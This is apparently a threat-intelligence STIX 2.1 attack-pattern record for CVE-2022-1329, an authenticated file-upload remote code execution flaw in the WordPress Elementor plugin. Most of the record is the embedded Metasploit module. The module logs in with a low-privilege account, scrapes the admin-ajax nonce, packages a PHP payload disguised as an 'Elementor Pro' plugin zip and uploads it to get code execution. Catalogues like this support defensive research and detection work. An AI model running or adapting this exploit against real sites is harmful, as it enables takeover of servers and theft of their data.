{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fcf7dc40-3c3e-47bf-bab9-75262494a9e0",
    "created": "2024-08-14T17:10:46.177991Z",
    "modified": "2024-08-14T17:10:46.177995Z",
    "name": "Wordpress Plugin Elementor Authenticated Upload Remote Code Execution",
    "description": " The WordPress plugin Elementor versions 3.6.0 - 3.6.2, inclusive have a vulnerability that allows any authenticated user to upload and execute any PHP file. This is achieved by sending a request to install Elementor Pro from a user supplied zip file. Any user with Subscriber or more permissions is able to execute this. Tested against Elementor 3.6.1  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_plugin_elementor_auth_upload_rce.rb",
            "external_id": "wp_plugin_elementor_auth_upload_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-1329"
        },
        {
            "source_name": "reference",
            "url": "https://www.wordfence.com/blog/2022/04/elementor-critical-remote-code-execution-vulnerability/"
        },
        {
            "source_name": "reference",
            "url": "https://www.youtube.com/watch?v=tIhN1svzAYk#greatvideoabouttheexploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Wordpress Plugin Elementor Authenticated Upload Remote Code Execution',\n        'Description' => %q{\n          The WordPress plugin Elementor versions 3.6.0 - 3.6.2, inclusive have a vulnerability\n          that allows any authenticated user to upload and execute any PHP file. This is achieved\n          by sending a request to install Elementor Pro from a user supplied zip file.\n          Any user with Subscriber or more permissions is able to execute this.\n          Tested against Elementor 3.6.1\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ramuel Gall', # Discovery\n          'AkuCyberSec', # Exploit-db\n          'h00die' # Metasploit module\n        ],\n        'References' => [\n          ['EDB', '50115'],\n          ['CVE', '2022-1329'],\n          ['URL', 'https://www.wordfence.com/blog/2022/04/elementor-critical-remote-code-execution-vulnerability/'],\n          ['URL', 'https://www.youtube.com/watch?v=tIhN1svzAYk'] # great video about the exploit\n        ],\n        'Platform' => [ 'php' ],\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [ 'Wordpress Elementor', {}]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2022-03-29',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('USERNAME', [true, 'Username of a subscriber or higher account', '']),\n      OptString.new('PASSWORD', [true, 'Password of a subscriber or higher account', '']),\n      OptString.new('TARGETURI', [true, 'The base path of the Wordpress server', '/'])\n    ]\n  end\n\n  def check\n    unless wordpress_and_online?\n      return CheckCode::Safe('Server not online or not detected as Wordpress')\n    end\n\n    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])\n    CheckCode::Safe('Invalid credentials given!') unless cookie\n\n    return check_plugin_version_from_readme('elementor', '3.6.3', '3.6.0')\n  end\n\n  def upload_file(nonce, cookie)\n    zip_file = Rex::Zip::Archive.new\n    payload_name = 'elementor-pro.php'\n    print_status(\"Payload file name: #{payload_name}\")\n    # we end up in wp-admin, so we need to get to the right folder\n    register_dirs_for_cleanup('../wp-content/plugins/elementor-pro')\n    # payload must contain a Plugin Name header with the name of the plugin\n    pload = \"<?php\\n\"\n    pload << \"/**\\n\"\n    pload << \"* Plugin Name: Elementor Pro\\n\"\n    pload << \"*/\\n\"\n    pload << payload.encoded.gsub('/*<?php /**/ ', '')\n    pload << \"\\n?>\"\n    zip_file.add_file(\"/elementor-pro/#{payload_name}\", pload)\n\n    vars_form_data = [\n      # post_data.add_part('elementor_upload_and_install_pro', nil, nil, 'form-data; name=\"action\"')\n      {\n        'name' => 'action',\n        'data' => 'elementor_upload_and_install_pro'\n      },\n      # post_data.add_part(nonce, nil, nil, 'form-data; name=\"_nonce\"')\n      {\n        'name' => '_nonce',\n        'data' => nonce\n      },\n      # post_data.add_part(zip_file.pack, 'application/x-zip-compressed', 'binary', 'form-data; name=\"fileToUpload\"; filename=\"elementor-pro.zip\"')\n      {\n        'name' => 'fileToUpload',\n        'data' => zip_file.pack,\n        'encoding' => 'binary',\n        'filename' => 'elementor-pro.zip',\n        'mime_type' => 'application/x-zip-compressed'\n      }\n\n    ]\n\n    resp = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),\n      'cookie' => cookie,\n      'vars_form_data' => vars_form_data\n    )\n    # we get a timeout on success\n    if resp.nil?\n      print_good('Payload Uploaded Successfully')\n      return\n    end\n    fail_with(Failure::UnexpectedReply, 'Error uploading payload')\n  end\n\n  def get_nonce(cookie)\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'profile.php'),\n      'cookie' => cookie\n    )\n\n    unless res && (res.code == 200)\n      fail_with(Failure::UnexpectedReply, \"Could not get the nonce (#{res.code})\")\n    end\n    # find the RIGHT nonce, there are many nonces on the page, but we need the admin-ajax one\n    res.body.scan(/admin-ajax.php\",\"nonce\":\"([a-z0-9]+)\"/)[0][0].to_s\n  end\n\n  def exploit\n    cookie = wordpress_login(datastore['USERNAME'], datastore['PASSWORD'])\n    fail_with(Failure::NoAccess, 'Authentication failed') unless cookie\n    cookie = cookie.gsub('wordpress_test_cookie=WP%20Cookie%20check; ', '')\n\n    print_status('Looking for nonce')\n    nonce = get_nonce(cookie)\n    fail_with(Failure::NoAccess, 'Unable to find nonce') if nonce.nil?\n    print_good(\"Nonce: #{nonce}\")\n\n    print_status('Uploading upgrade payload and activating...')\n    upload_file(nonce, cookie)\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-03-29",
    "x_mitre_platforms": [
        "[ 'php' ]"
    ]
}